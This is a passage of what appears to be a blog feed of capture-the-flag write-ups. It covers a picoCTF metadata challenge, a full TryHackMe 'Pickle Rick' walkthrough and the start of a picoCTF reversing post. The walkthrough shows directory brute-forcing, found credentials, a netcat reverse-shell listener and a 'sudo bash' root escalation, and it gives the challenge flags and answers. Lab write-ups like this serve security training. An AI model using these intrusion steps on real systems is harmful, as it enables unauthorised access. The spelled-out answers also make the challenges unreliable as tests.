</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>ukn_reality.jpg  unknown.zip</span></span></code></pre></div>
<br>
<p>Inside the zip file, there was a <code>.jpg</code> file named ukn_reality.jpg and it looked like the following:</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>Since this was the only file given to me, I knew I had to look up the file&rsquo;s info to capture the flag. So the first thing I tried was to run a <code>file</code> command. However, nothing useful was found.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ file ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>ukn_reality.jpg: JPEG image data, JFIF standard 1.01, resolution <span style="color:#89dceb;font-weight:bold">(</span>DPI<span style="color:#89dceb;font-weight:bold">)</span>, density 72x72, segment length 16, baseline, precision 8, 4308x2875, components <span style="color:#fab387">3</span></span></span></code></pre></div>
<br>
<p>Then I asked chatGPT for ways to view information about an image and it provided some commonly used methods:</p>
<ol>
<li><code>file</code> command</li>
<li><code>identify</code> from ImageMagick</li>
<li><code>exiftool</code></li>
<li><code>exiv2</code></li>
</ol>
<p>I further looked into the commands and thought the <code>exiftool</code> would give me the most information about the image.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ exiftool ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>File Name                       : ukn_reality.jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Directory                       : .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>File Size                       : 2.3 MB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>File Modification Date/Time     : 2024:03:11 20:05:51-04:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>File Access Date/Time           : 2024:07:09 16:33:57-04:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>File Inode Change Date/Time     : 2024:07:09 16:33:51-04:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>File Type                       : JPEG
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>File Type Extension             : jpg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>MIME Type                       : image/jpeg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>JFIF Version                    : 1.01
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Resolution Unit                 : inches
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>X Resolution                    : <span style="color:#fab387">72</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Y Resolution                    : <span style="color:#fab387">72</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>XMP Toolkit                     : Image::ExifTool 11.88
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Attribution URL                 : <span style="color:#f5e0dc">cGljb0NURntNRTc0RDQ3QV9ISUREM05fM2I5MjA5YTJ9Cg</span><span style="color:#89dceb;font-weight:bold">==</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Image Width                     : <span style="color:#fab387">4308</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>Image Height                    : <span style="color:#fab387">2875</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>Encoding Process                : Baseline DCT, Huffman coding
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Bits Per Sample                 : <span style="color:#fab387">8</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>Color Components                : <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">2</span> 2<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>Image Size                      : 4308x2875
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>Megapixels                      : 12.4</span></span></code></pre></div>
<br>
<p>If you look closely the value for <code>Attribution URL</code> is not in the expected form. It looks like it&rsquo;s encoded or hashed. I tried decoding the given URL with the <code>base64</code> command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/pico<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ <span style="color:#89dceb">echo</span> <span style="color:#f5e0dc">cGljb0NURntNRTc0RDQ3QV9ISUREM05fM2I5MjA5YTJ9Cg</span><span style="color:#89dceb;font-weight:bold">==</span> | base64 -d
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>ME74D47A_HIDD3N_3b9209a2<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p>And we got the flag!</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{ME74D47A_HIDD3N_3b9209a2}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Pickle Rick</title>
      <link>http://localhost:1313/thm-pickle-rick/</link>
      <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-pickle-rick/</guid>
      <description>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.
Deploy the virtual machine on this task and explore the web application
What is the first ingredient that Rick needs? mr. meeseek hair The first enumeration step I took was to run a nmap scan. In the meanwhile, I browsed the source code of the target website and found the following: username: R1ckRul3s, which implies that there&amp;rsquo;s going to be some sort of login webpage within the target website.</description>
      <content:encoded><![CDATA[<p>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.</p>
<p>Deploy the virtual machine on this task and explore the web application</p>
<h4 id="what-is-the-first-ingredient-that-rick-needs">What is the first ingredient that Rick needs?</h4>






<pre tabindex="0"><code>mr. meeseek hair</code></pre>
<br>
<p>The first enumeration step I took was to run a nmap scan. In the meanwhile, I browsed the source code of the target website and found the following: <code>username: R1ckRul3s</code>, which implies that there&rsquo;s going to be some sort of login webpage within the target website.</p>
<p><img src="image.png#center" alt="alt text"></p>
<p>Through the nmap scan, I confirmed there&rsquo;s 2 open ports: 1 ssh and 1 http server. The next thing I did was to run a <code>gobuster</code> to brute-force against the target URL and to find directories and files using a wordlist. Also I appended <code>-x</code> option, this means that Gobuster will test each directory/file name with the given extensions.</p>
<p><code>gobuster dir -u http://10.10.243.38 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,css,txt,db,js,py</code></p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<p>gobuster ouput gave me some useful information. Let&rsquo;s take a look at the <code>robot.txt</code> file first. The robot.txt file only contained <code>Wubbalubbadubdub</code>, which could be a password for the username we found earlier.</p>
<p><img src="image-2.png#center" alt="alt text">
<br></p>
<p>To test my theory, I navigated to <code>/login.php</code> url and inputted the username, R1ckRul3s and the password, Wubbalubbadubdub. It turned out they were the correct credentials and the site directed me to <code>/portal.php</code></p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>I typed <code>ls</code> command then got the following result. Then I tried <code>cat Sup3rS3cretPickl3Ingred.txt</code> but it said &ldquo;command disabled&rdquo;, so I navigated to /Sup3rS3cretPickl3Ingred.txt and got <code>mr. meeseek hair</code>, which turned out to be the first ingredient of the task!
<img src="image-4.png#center" alt="alt text"></p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-second-ingredient-in-ricks-potion">What is the second ingredient in Rick&rsquo;s potion?</h4>






<pre tabindex="0"><code>1 jerry tear</code></pre>
<br>
<p>Since we can execute some of the commands on the target website. I think it&rsquo;s best to try reverse-shell. I visited the <code>pentest monkey</code> to refer to their <strong>Reverse Shell Cheat Sheet</strong> for Python reverse shell. Make sure to change the IP address to your own and change the <code>python</code> to <code>python3</code>.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
Before running the reverse-shell command, I made sure I'm running the netcat in order to capture the shell.






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...</span></span></code></pre></div>
<br>
<p>I was able to caputre the shell after I had executed the python reverse shell command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.242.29<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">38160</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Sup3rS3cretPickl3Ingred.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>assets
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>clue.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>denied.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>index.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>login.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>portal.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>robots.txt</span></span></code></pre></div>
<br>
<p>I remembered there was <code>clue.txt</code> file which showed me a hint for the second ingredient.</p>
<p><img src="image-6.png" alt="alt text"></p>
<br>
<p>I looked around the file system in the shell for a while then I finally found the file named <code>second ingredients</code>!</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>$ <span style="color:#89dceb">cd</span> home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>rick
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>ubuntu
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>$ <span style="color:#89dceb">cd</span> rick
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>second ingredients
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>$ ls -la
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>total <span style="color:#fab387">12</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>drwxrwxrwx <span style="color:#fab387">2</span> root root <span style="color:#fab387">4096</span> Feb <span style="color:#fab387">10</span>  <span style="color:#fab387">2019</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>drwxr-xr-x <span style="color:#fab387">4</span> root root <span style="color:#fab387">4096</span> Feb <span style="color:#fab387">10</span>  <span style="color:#fab387">2019</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>-rwxrwxrwx <span style="color:#fab387">1</span> root root   <span style="color:#fab387">13</span> Feb <span style="color:#fab387">10</span>  <span style="color:#fab387">2019</span> second ingredients
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>$ cat <span style="color:#a6e3a1">&#34;second ingredients&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">1</span> jerry tear</span></span></code></pre></div>
<br>
<h4 id="what-is-the-last-and-final-ingredient">What is the last and final ingredient?</h4>






<pre tabindex="0"><code>fleeb juice</code></pre>
<br>
<p>After we got the second flag, while still in the shell we captured, I ran <code>sudo -l</code> command to see what commands I&rsquo;m permitted to run using <code>sudo</code> and it turned out there was no restriction at all.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>$ sudo -l
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Matching Defaults entries <span style="color:#cba6f7">for</span> www-data on ip-10-10-242-29:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>    <span style="color:#f5e0dc">secure_path</span><span style="color:#89dceb;font-weight:bold">=</span>/usr/local/sbin<span style="color:#89b4fa">\:</span>/usr/local/bin<span style="color:#89b4fa">\:</span>/usr/sbin<span style="color:#89b4fa">\:</span>/usr/bin<span style="color:#89b4fa">\:</span>/sbin<span style="color:#89b4fa">\:</span>/bin<span style="color:#89b4fa">\:</span>/snap/bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>User www-data may run the following commands on ip-10-10-242-29:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>    <span style="color:#89dceb;font-weight:bold">(</span>ALL<span style="color:#89dceb;font-weight:bold">)</span> NOPASSWD: ALL</span></span></code></pre></div>
<br>
<p>Because I knew that I could run any command with sudo, I went straight to run the <code>sudo bash</code> command. This command runs a new instance of Bash shell with root privileges. This effectively gives you a root shell. Once I got the root priviliege, the rest was easy. I navigated to the <code>root</code> folder and there was the third ingredients inside it.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>snap
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>vmlinuz
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>vmlinuz.old
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb">cd</span> root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>3rd.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>snap
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>cat 3rd.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>3rd ingredients: fleeb juice</span></span></code></pre></div>
<p>I got the last ingredients for this task!</p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] packer</title>
      <link>http://localhost:1313/picoctf-packer/</link>
      <pubDate>Mon, 08 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-packer/</guid>
      <description>Description Reverse this linux executable?
First, I downloaded the file to my local machine using the wget comand.
wget https://artifacts.picoctf.net/c_titan/103/out
It seems like a binary file that contains non-human readable contents inside it
1(kalikali)-[~/Desktop] 2$ ls 3hello.php5 hello.png leewookb.ovpn out shell.js 4 5(kalikali)-[~/Desktop] 6$ file out 7out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header I used the strings command to extract and print only the readable strings from the binary file and found these words that might be useful.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>Reverse this linux executable?</p>
<hr>
<p>First, I downloaded the file to my local machine using the <strong>wget</strong> comand.</p>
<p><code>wget https://artifacts.picoctf.net/c_titan/103/out</code></p>
<p>It seems like a binary file that contains non-human readable contents inside it</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>hello.php5  hello.png  leewookb.ovpn  out  shell.js
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
